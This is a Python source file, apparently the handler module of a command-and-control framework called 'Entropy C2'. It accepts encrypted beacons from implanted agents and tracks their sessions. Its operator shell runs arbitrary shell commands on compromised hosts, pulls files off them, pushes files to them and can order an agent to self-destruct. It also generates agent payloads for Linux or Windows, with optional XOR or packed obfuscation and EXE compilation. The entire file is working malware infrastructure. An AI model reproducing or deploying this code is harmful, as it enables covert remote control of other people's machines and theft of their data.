import base64
import os
import socket
import threading

from modules.crypto import encrypt, decrypt

# ANSI colors
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
M = "\033[95m"
C = "\033[96m"
W = "\033[97m"
N = "\033[0m"
S = "\033[1m"
D = "\033[2m"


def _colorize(text, color):
    return f"{color}{text}{N}"


class Handler:
    def __init__(self, host, port, key):
        self.host = host
        self.port = port
        self.key = key
        self.sessions = {}
        self.next_id = 1
        self.server = None
        self.running = False

    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        self.running = True
        print(
            f" {_colorize('[*]', B)} Handler listening on "
            f"{_colorize(f'{self.host}:{self.port}', C)}"
        )
        threading.Thread(target=self._accept_loop, daemon=True).start()

    def stop(self):
        self.running = False
        for session in self.sessions.values():
            try:
                session["socket"].close()
            except Exception:
                pass
        self.sessions.clear()
        try:
            self.server.close()
        except Exception:
            pass

    def _accept_loop(self):
        while self.running:
            try:
                client, addr = self.server.accept()
                try:
                    beacon = client.recv(4096)
                    if not beacon:
                        client.close()
                        continue
                    decrypt(self.key, beacon)
                except Exception:
                    client.close()
                    continue

                sid = self.next_id
                self.next_id += 1
                self.sessions[sid] = {"socket": client, "addr": addr, "alive": True}
                print()
                print(
                    f" {_colorize('[+]', G)} New session "
                    f"{_colorize(f'#{sid}', C)} from "
                    f"{_colorize(f'{addr[0]}:{addr[1]}', Y)}"
                )
            except Exception:
                break

    def _send_recv(self, sock, data):
        payload = encrypt(self.key, data)
        sock.sendall(len(payload).to_bytes(4, "big") + payload)

        header = sock.recv(4)
        if not header:
            return None
        resp_len = int.from_bytes(header, "big")
        response = b""
        while len(response) < resp_len:
            chunk = sock.recv(resp_len - len(response))
            if not chunk:
                return None
            response += chunk
        return decrypt(self.key, response).decode(errors="replace")

    def send_command(self, sid, command):
        session = self.sessions.get(sid)
        if not session or not session["alive"]:
            return None
        try:
            result = self._send_recv(session["socket"], command)
            if result is None:
                session["alive"] = False
            return result
        except Exception:
            session["alive"] = False
            return None

    def list_sessions(self):
        if not self.sessions:
            print(f" {_colorize('[!]', Y)} No active sessions")
            return
        alive = sum(1 for s in self.sessions.values() if s["alive"])
        print()
        print(
            f" {_colorize(f'Sessions: {len(self.sessions)} total, '
            f'{alive} active', C)}"
        )
        print(
            f" {D}{'ID':<5} {'Host':<20} {'Port':<8} {'Status':<10}{N}"
        )
        print(f" {D}{'-'*45}{N}")
        for sid, session in sorted(self.sessions.items()):
            status = (
                _colorize("Active", G)
                if session["alive"]
                else _colorize("Dead", R)
            )
            print(
                f" {_colorize(str(sid), C):<5} "
                f"{session['addr'][0]:<20} "
                f"{str(session['addr'][1]):<8} "
                f"{status}"
            )
        print()

    def download_file(self, sid, remote_path):
        local_name = os.path.basename(remote_path)
        result = self.send_command(sid, f"__download__|{remote_path}")
        if result is None:
            print(f" {_colorize('[!]', R)} Session {sid} disconnected")
            return
        if result.startswith("__error__|"):
            err = result[9:]
            print(f" {_colorize('[!]', R)} Download error: {err}")
            return
        try:
            data = base64.b64decode(result)
        except Exception:
            print(f" {_colorize('[!]', R)} Failed to decode download data")
            return
        with open(local_name, "wb") as f:
            f.write(data)
        print(
            f" {_colorize('[+]', G)} Downloaded "
            f"{_colorize(str(len(data)), C)} bytes: "
            f"{_colorize(remote_path, Y)} -> "
            f"{_colorize(local_name, G)}"
        )

    def upload_file(self, sid, local_path, remote_path=None):
        if not os.path.exists(local_path):
            print(f" {_colorize('[!]', R)} File not found: {local_path}")
            return
        if remote_path is None:
            remote_path = os.path.basename(local_path)
        with open(local_path, "rb") as f:
            raw = f.read()
        b64 = base64.b64encode(raw).decode()
        result = self.send_command(sid, f"__upload__|{remote_path}|{b64}")
        if result is None:
            print(f" {_colorize('[!]', R)} Session {sid} disconnected")
            return
        if result.startswith("__error__|"):
            err = result[9:]
            print(f" {_colorize('[!]', R)} Upload error: {err}")
            return
        print(
            f" {_colorize('[+]', G)} Uploaded "
            f"{_colorize(str(len(raw)), C)} bytes: "
            f"{_colorize(local_path, Y)} -> "
            f"{_colorize(remote_path, G)}"
        )

    def interact_session(self, sid):
        session = self.sessions.get(sid)
        if not session or not session["alive"]:
            print(f" {_colorize('[!]', R)} Session {sid} is not active")
            return
        addr = session["addr"]
        print()
        print(f" {_colorize('[*]', B)} Interacting with "
              f"{_colorize(f'session #{sid}', C)} "
              f"({_colorize(f'{addr[0]}:{addr[1]}', Y)})")
        print(f" {_colorize('[*]', D)} Type "
              f"{_colorize('help', C)} for commands, "
              f"{_colorize('back', C)} to return")
        while True:
            try:
                cmd = input(f" {_colorize('agent', M)}({_colorize(f'#{sid}', C)})> ").strip()
                if not cmd:
                    continue
                if cmd == "back":
                    break
                if cmd == "help":
                    print()
                    print(f" {_colorize('Commands:', S)}")
                    print(f"   {_colorize('help', C)}        Show this help")
                    print(f"   {_colorize('back', C)}        Return to handler")
                    print(f"   {_colorize('ping', C)}        Check if agent is alive")
                    print(f"   {_colorize('info', C)}        Show agent information")
                    print(f"   {_colorize('download <path>', C)}  Download file from agent")
                    print(f"   {_colorize('upload <local> [remote]', C)}  Upload file to agent")
                    print(f"   {_colorize('selfdestruct', C)}  Remove agent from system")
                    print(f"   {_colorize('<command>', C)}    Execute any shell command")
                    print()
                    continue
                if cmd == "ping":
                    result = self.send_command(sid, "__ping__")
                    if result == "__pong__":
                        print(f" {_colorize('[+]', G)} Agent is "
                              f"{_colorize('alive', G)}")
                    else:
                        print(f" {_colorize('[!]', R)} Agent not responding")
                    continue
                if cmd == "info":
                    result = self.send_command(sid, "__info__")
                    if result:
                        parts = result.split("|")
                        labels = [
                            "Platform",
                            "OS name",
                            "CWD",
                            "Home",
                            "User",
                            "Hostname",
                            "UUID",
                        ]
                        print()
                        for lbl, val in zip(labels, parts):
                            print(f"   {_colorize(lbl + ':', C):<12} {val}")
                        print()
                    else:
                        print(f" {_colorize('[!]', R)} No response")
                    continue
                if cmd.startswith("download "):
                    path = cmd[9:].strip()
                    if not path:
                        print(f" {_colorize('[!]', Y)} Usage: download <remote_path>")
                    else:
                        self.download_file(sid, path)
                    continue
                if cmd.startswith("upload "):
                    rest = cmd[7:].strip()
                    parts = rest.split()
                    if not parts:
                        print(f" {_colorize('[!]', Y)} Usage: upload <local> [remote]")
                    else:
                        local = parts[0]
                        remote = parts[1] if len(parts) > 1 else None
                        self.upload_file(sid, local, remote)
                    continue
                if cmd == "selfdestruct":
                    confirm = input(
                        f" {_colorize('[!]', R)} This will destroy the agent. "
                        f"Continue? (y/N): "
                    )
                    if confirm.lower() == "y":
                        result = self.send_command(sid, "__selfdestruct__")
                        if result and "__ok__" in result:
                            print(
                                f" {_colorize('[+]', G)} Agent "
                                f"{_colorize('self-destructed', R)}"
                            )
                        else:
                            print(f" {_colorize('[!]', R)} Self-destruct failed")
                        break
                    continue

                # Any other command -> send raw to agent
                result = self.send_command(sid, cmd)
                if result is None:
                    print(f" {_colorize('[!]', R)} Session {sid} disconnected")
                    break
                print(result, end="")
                if not result.endswith("\n"):
                    print()
            except KeyboardInterrupt:
                print()
                break

    def generate_payload(self):
        from modules.agent import generate_payload

        print()
        print(f" {_colorize('[*]', B)} Generate Agent Payload")
        print(f" {_colorize('[*]', D)} Handler key: {_colorize(self.key.decode(), C)}")
        print()
        ip = input(f" {_colorize('?', Y)} Handler IP for agent: ").strip()
        if not ip:
            print(f" {_colorize('[!]', R)} IP address is required")
            return
        port_str = input(f" {_colorize('?', Y)} Handler Port [{self.port}]: ").strip()
        port = int(port_str) if port_str else self.port
        os_type = (input(f" {_colorize('?', Y)} OS (linux/windows) [linux]: ").strip().lower() or "linux")
        if os_type not in ("linux", "windows"):
            print(f" {_colorize('[!]', R)} Invalid OS")
            return
        obf = (input(f" {_colorize('?', Y)} Obfuscation (none/xor/packed) [none]: ").strip().lower() or "none")
        if obf not in ("none", "xor", "packed"):
            obf = "none"
        compile_exe_str = input(f" {_colorize('?', Y)} Compile to EXE? (y/N): ").strip().lower()
        compile_exe = compile_exe_str == "y"

        filepath, key_str, exe_path = generate_payload(
            ip, port, os_type, self.key, obf, compile_exe, output_dir="payloads"
        )
        print()
        print(f" {_colorize('[+]', G)} Payload: {_colorize(filepath, C)}")
        if exe_path:
            print(f" {_colorize('[+]', G)} EXE:     {_colorize(exe_path, C)}")
        print(f" {_colorize('[+]', G)} Key:     {_colorize(key_str, Y)}")
        print()

    def shell(self):
        print()
        print(f" {_colorize('[*]', B)} Entropy C2 Interactive Shell")
        print(f" {_colorize('[*]', D)} Type {_colorize('help', C)} for available commands")
        while True:
            try:
                cmd = input(f" {_colorize('entropy', G)}({_colorize('c2', C)})> ").strip()
                if not cmd:
                    continue
                parts = cmd.split()
                if parts[0] == "help":
                    self._show_help()
                elif parts[0] == "sessions":
                    self.list_sessions()
                elif parts[0] == "interact":
                    if len(parts) == 2:
                        try:
                            self.interact_session(int(parts[1]))
                        except ValueError:
                            print(f" {_colorize('[!]', Y)} Usage: interact <session_id>")
                    else:
                        print(f" {_colorize('[!]', Y)} Usage: interact <session_id>")
                elif parts[0] == "generate":
                    self.generate_payload()
                elif parts[0] in ("exit", "back"):
                    print(f" {_colorize('[*]', B)} Returning to main menu")
                    break
                else:
                    print(f" {_colorize('[!]', Y)} Unknown command. "
                          f"Type {_colorize('help', C)} for options.")
            except KeyboardInterrupt:
                print()
                break

    @staticmethod
    def _show_help():
        print()
        print(f" {_colorize('Handler Commands:', S)}")
        print(f"   {_colorize('sessions', C)}        List active agent sessions")
        print(f"   {_colorize('interact <id>', C)}   Interact with an agent session")
        print(f"   {_colorize('generate', C)}        Generate an agent payload")
        print(f"   {_colorize('help', C)}            Show this help message")
        print(f"   {_colorize('exit / back', C)}     Return to main menu")
        print()
        print(f" {_colorize('Interaction Commands:', S)}")
        print(f"   {_colorize('help', C)}            Show interaction help")
        print(f"   {_colorize('back', C)}            Return to handler")
        print(f"   {_colorize('ping', C)}            Check if agent is alive")
        print(f"   {_colorize('info', C)}            Show agent platform info")
        print(f"   {_colorize('download <p>', C)}    Download file from agent")
        print(f"   {_colorize('upload <l> [r]', C)}  Upload file to agent")
        print(f"   {_colorize('selfdestruct', C)}    Remove agent from system")
        print()
